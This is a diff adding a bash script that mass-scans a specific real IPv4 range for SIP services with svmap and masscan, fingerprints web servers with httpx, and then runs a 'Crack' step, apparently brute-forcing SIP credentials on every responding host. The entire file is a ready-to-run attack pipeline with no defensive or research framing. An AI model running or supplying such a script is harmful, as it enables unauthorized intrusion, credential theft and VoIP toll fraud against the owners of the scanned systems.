@@ -1,0 +1,56 @@
+#!/bin/bash
+
+# Scan IPv4 range on port sip
+
+echo -e "\nStart scanning ...\n"
+
+VAR0=188.165.50.0/18
+
+         echo ----------------- $VAR0----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR0 -m INVITE -v >> result.txt
+
+echo "we scaned Everythings"
+sleep 10
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" result.txt >>IPS
+perl run IPS
+cat 401.pal 400.pal 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+mv result.txt =204.txt # change file name
+sleep 5
+
+echo -e "\nEnding Responses !\n"
+
+# Scan masscan ports
+
+echo -e "\nStart scan ports ...\n"
+
+grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" =204.txt > =204ip.txt
+masscan -iL =204ip.txt -p443,80,81,82,83,84,85,86,87,88,89,90,8000,8001,8008,8014,8015,8020,8028,8040,8080,8081,8082,8085,8088,8090,8118,8123,8180,8181,8182,8222,8243,8280,8300,8800,8888,8899,8983,9000,9002,9060,9080,9090,9091 --rate=200000 -oL masscan.txt
+awk '{print $4 ":" $3}' masscan.txt > =204new.txt # Save scan masscan Range 
+cat =204new.txt | docker run -i projectdiscovery/httpx -sc -title -server -t 250 -leave-default-ports -nc -v >> =204httpxresult.txt
+rm =204new.txt  # remove the temporary file
+rm =204ip.txt  # remove the temporary file
+rm masscan.txt # remove the temporary file
+sleep 5
+
+echo -e "\nEnding scan port !\n"
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 1000 2 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 5
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
